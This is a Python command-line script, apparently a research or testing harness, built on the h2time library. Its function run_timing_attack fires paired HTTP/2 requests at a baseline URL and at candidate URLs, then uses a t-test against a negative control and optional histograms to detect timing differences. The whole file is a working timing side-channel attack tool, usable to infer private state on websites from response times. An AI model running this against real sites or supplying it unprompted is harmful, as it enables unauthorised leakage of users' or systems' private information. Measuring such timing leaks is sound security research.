import asyncio
import time
import random
import click
import matplotlib.pyplot as plt
from h2time import H2Request, H2Time
from scipy import stats


def run_timing_attack(url1, url2, n_pairs=10):
    async def timing_attack():
        r1 = H2Request('GET', url1)
        r2 = H2Request('GET', url2)

        async with H2Time(r1, r2, num_request_pairs=n_pairs) as h2t:
            results = await h2t.run_attack()
            print('\n'.join(map(lambda x: ','.join(map(str, x)), results)))
            counts = [t for t, _, _ in results]
            return counts

    return asyncio.run(timing_attack())


@click.command()
@click.argument('baseline', nargs=1)
@click.argument('neg', nargs=1)
@click.argument('urls', nargs=-1)
@click.option('--graph', is_flag=True, default=False)
@click.option('--n-pairs', default=5)
@click.option('--repeat', default=5)
@click.option('--bins', default=10)
def main(baseline, neg, urls, graph, n_pairs, repeat, bins):
    results = {url: [] for url in urls}
    base = {}
    base[neg] = []

    def fun(ref, test_url):
        return lambda: ref[test_url].extend(
            run_timing_attack(baseline, test_url, n_pairs=n_pairs)
        )

    funcs = []
    for url in urls:
        for i in range(repeat):
            funcs.append((url, fun(results, url)))

    funcs.extend([(neg, fun(base, neg)) for i in range(repeat)])

    random.shuffle(funcs)

    # now process all the tests
    for _, func in funcs:
        func()
        time.sleep(1)

    for url in urls:
        t_check = stats.ttest_ind(base[neg], results[url])
        print(url, t_check)

    if graph:
        plt.figure(figsize=(8, 6))
        for url in urls:
            plt.hist(results[url], bins=bins, alpha=0.5, label=url)
        plt.legend(loc='upper right')
        plt.show()


if __name__ == "__main__":
    main()
